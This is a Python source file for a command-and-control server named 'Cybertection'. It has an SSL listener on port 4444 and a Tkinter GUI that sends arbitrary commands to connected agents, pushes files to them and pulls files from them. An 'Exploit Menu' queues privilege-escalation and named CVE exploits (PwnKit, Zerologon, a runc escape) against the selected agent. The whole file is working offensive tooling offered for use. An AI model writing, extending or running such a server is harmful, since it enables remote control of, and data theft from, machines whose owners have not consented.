import socket
import threading
import time
import base64
import tkinter as tk
from tkinter import ttk, scrolledtext, Toplevel, messagebox
from datetime import datetime
import os
import ssl
import subprocess

class CybertectionServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket = self.context.wrap_socket(self.server_socket, server_side=True)
        self.clients = {}  # {client_socket: addr}
        self.log_file = "cybertection_log.txt"
        self.root = None
        self.output_text = None
        self.client_list = None
        self.running = True
        self.log_entries = []
        self.command_queue = {}  # {client_socket: command}

    def log_action(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.log_entries.append(log_entry)
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
        if self.output_text:
            self.output_text.insert(tk.END, log_entry + "\n")
            self.output_text.see(tk.END)

    def start_server(self):
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.log_action(f"Cybertection C2 Server started on {self.host}:{self.port} (SSL)")
        except Exception as e:
            self.log_action(f"Failed to start server: {e}")
            return

        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                self.clients[client_socket] = addr
                self.log_action(f"New agent connected: {addr}")
                self.update_client_list()
                threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
            except Exception as e:
                if self.running:
                    self.log_action(f"Server accept error: {e}")

    def handle_client(self, client_socket, addr):
        self.log_action(f"Handling client {addr}")
        try:
            while self.running:
                command = self.get_command_from_gui(client_socket)
                if command is None:
                    time.sleep(0.1)  # Avoid tight loop
                    continue
                if command.lower() == "exit":
                    client_socket.send(command.encode())
                    break
                elif command.startswith("upload "):
                    file_path = command.split("upload ")[1]
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode()
                    client_socket.send(f"upload {os.path.basename(file_path)} {file_data}".encode())
                    response = client_socket.recv(4096).decode()
                    self.log_action(f"Upload to {addr}: {response}")
                elif command.startswith("download "):
                    file_name = command.split("download ")[1]
                    client_socket.send(f"download {file_name}".encode())
                    data = client_socket.recv(1024 * 1024).decode()
                    with open(f"downloaded_{file_name}", "wb") as f:
                        f.write(base64.b64decode(data))
                    self.log_action(f"Downloaded {file_name} from {addr}")
                else:
                    client_socket.send(command.encode())
                    response = client_socket.recv(4096).decode()
                    self.log_action(f"Command to {addr}: {command}\nResponse: {response}")
        except Exception as e:
            self.log_action(f"Error with {addr}: {e}")
        finally:
            client_socket.close()
            if client_socket in self.clients:
                del self.clients[client_socket]
                self.log_action(f"Agent {addr} disconnected")
                self.update_client_list()

    def update_client_list(self):
        if self.client_list:
            self.client_list.delete(0, tk.END)
            for addr in self.clients.values():
                self.client_list.insert(tk.END, str(addr))

    def get_command_from_gui(self, client_socket):
        if client_socket not in self.command_queue or self.command_queue[client_socket] is None:
            return None
        cmd = self.command_queue[client_socket]
        self.command_queue[client_socket] = None  # Clear after retrieval
        self.log_action(f"Retrieved command for {self.clients[client_socket]}: {cmd}")
        return cmd

    def send_command(self, entry, client_socket):
        cmd = entry.get().strip()
        if not cmd:
            messagebox.showwarning("Warning", "Please enter a command")
            return
        if client_socket:
            self.command_queue[client_socket] = cmd
            self.log_action(f"Queued command for {self.clients[client_socket]}: {cmd}")
        else:
            messagebox.showerror("Error", "No agent selected")

    def send_exploit(self, exploit_cmd, client_socket):
        if client_socket:
            self.command_queue[client_socket] = exploit_cmd
            self.log_action(f"Queued exploit for {self.clients[client_socket]}: {exploit_cmd}")
        else:
            messagebox.showerror("Error", "No agent selected")

    def show_log_window(self):
        log_window = Toplevel(self.root)
        log_window.title("Cybertection Log")
        log_window.geometry("600x400")
        log_text = scrolledtext.ScrolledText(log_window, width=70, height=20)
        log_text.pack(pady=5)
        for entry in self.log_entries:
            log_text.insert(tk.END, entry + "\n")
        log_text.config(state="disabled")
        search_frame = ttk.Frame(log_window)
        search_frame.pack(pady=5)
        ttk.Label(search_frame, text="Filter:").pack(side=tk.LEFT)
        filter_entry = ttk.Entry(search_frame, width=30)
        filter_entry.pack(side=tk.LEFT, padx=5)
        def filter_log():
            log_text.config(state="normal")
            log_text.delete(1.0, tk.END)
            query = filter_entry.get().lower()
            for entry in self.log_entries:
                if not query or query in entry.lower():
                    log_text.insert(tk.END, entry + "\n")
            log_text.config(state="disabled")
        filter_entry.bind("<KeyRelease>", lambda e: filter_log())
        ttk.Button(search_frame, text="Clear Filter", command=lambda: [filter_entry.delete(0, tk.END), filter_log()]).pack(side=tk.LEFT)

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("Cybertection Server")
        self.root.geometry("800x600")
        self.root.protocol("WM_DELETE_WINDOW", self.shutdown)

        ttk.Label(self.root, text="Connected Agents:").pack(pady=5)
        self.client_list = tk.Listbox(self.root, height=5)
        self.client_list.pack(fill=tk.X, padx=10)
        self.output_text = scrolledtext.ScrolledText(self.root, width=80, height=15)
        self.output_text.pack(pady=10)

        command_frame = ttk.Frame(self.root)
        command_frame.pack(pady=5)
        ttk.Label(command_frame, text="Command:").pack(side=tk.LEFT)
        command_entry = ttk.Entry(command_frame, width=50)
        command_entry.pack(side=tk.LEFT, padx=5)
        def send_cmd():
            selected = self.client_list.curselection()
            if not selected:
                messagebox.showerror("Error", "Please select an agent")
                return
            addr = self.client_list.get(selected[0])
            client_socket = next((k for k, v in self.clients.items() if str(v) == addr), None)
            self.send_command(command_entry, client_socket)
        ttk.Button(command_frame, text="Send", command=send_cmd).pack(side=tk.LEFT)

        exploit_frame = ttk.Frame(self.root)
        exploit_frame.pack(pady=5)
        ttk.Label(exploit_frame, text="Exploit Menu:").pack(side=tk.LEFT)
        def run_exploit(exploit):
            selected = self.client_list.curselection()
            if not selected:
                messagebox.showerror("Error", "Please select an agent")
                return
            addr = self.client_list.get(selected[0])
            client_socket = next((k for k, v in self.clients.items() if str(v) == addr), None)
            self.send_exploit(exploit, client_socket)
        exploits = {
            "Elevate (Windows)": "elevate",
            "Inject (Windows)": "inject",
            "CVE-2021-4034 (Linux)": "cve-2021-4034",
            "CVE-2020-1472 (Zerologon - Windows)": "cve-2020-1472",
            "CVE-2019-5736 (runc Escape - Linux)": "cve-2019-5736"
        }
        exploit_dropdown = ttk.Combobox(exploit_frame, values=list(exploits.keys()), state="readonly")
        exploit_dropdown.pack(side=tk.LEFT, padx=5)
        ttk.Button(exploit_frame, text="Run Exploit", command=lambda: run_exploit(exploits.get(exploit_dropdown.get(), ""))).pack(side=tk.LEFT)

        ttk.Button(self.root, text="View Log", command=self.show_log_window).pack(pady=5)

        time.sleep(2)  # Ensure server binds
        threading.Thread(target=self.start_server, daemon=True).start()
        self.root.mainloop()

    def shutdown(self):
        self.running = False
        for client in list(self.clients.keys()):
            try:
                client.send(b"exit")
                client.close()
            except:
                pass
        self.server_socket.close()
        self.log_action("Server shut down")
        if self.root:
            self.root.destroy()

if __name__ == "__main__":
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        subprocess.run("openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'", shell=True, check=True)
    server = CybertectionServer()
    if not os.path.exists(server.log_file):
        with open(server.log_file, "w") as f:
            f.write("Cybertection C2 Log\n")
    server.setup_gui()
